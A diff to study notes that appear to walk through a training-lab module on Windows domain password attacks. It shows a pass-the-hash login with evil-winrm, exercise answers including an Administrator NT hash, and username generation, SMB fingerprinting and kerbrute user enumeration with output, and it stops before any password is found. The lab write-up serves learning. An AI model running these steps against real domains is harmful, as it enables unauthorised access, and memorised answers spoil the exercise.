@@ -1465,3 +1465,35 @@ We can still use hashes to attempt to authenticate with a system using a type of
 ```shell
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
+
+We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.
+## Exercise
+### What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts?
+
+NTDS.dit
+### Submit the NT hash associated with the Administrator user from the example output in the section reading.
+
+64f12cddaa88057e06a81b54e73b949b
+### On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
+
+```shell
+./username-anarchy John Marston > usernames.txt 
+./username-anarchy Carol Johnson >> usernames.txt
+./username-anarchy Jennifer Stapleton >> usernames.txt 
+```
+
+First, we need to verify the domain by typing:
+
+```shell
+netexec smb 10.129.236.78
+---
+SMB         10.129.236.78   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
+```
+
+```shell
+kerbrute userenum --dc 10.129.236.78 usernames.txt --domain ILF.local
+---
+2026/10/04 12:09:43 >  [+] VALID USERNAME:	 jstapleton@ILF.local
+2026/10/04 12:09:44 >  [+] VALID USERNAME:	 cjohnson@ILF.local
+2026/10/04 12:09:45 >  [+] VALID USERNAME:	 jmarston@ILF.local
+```
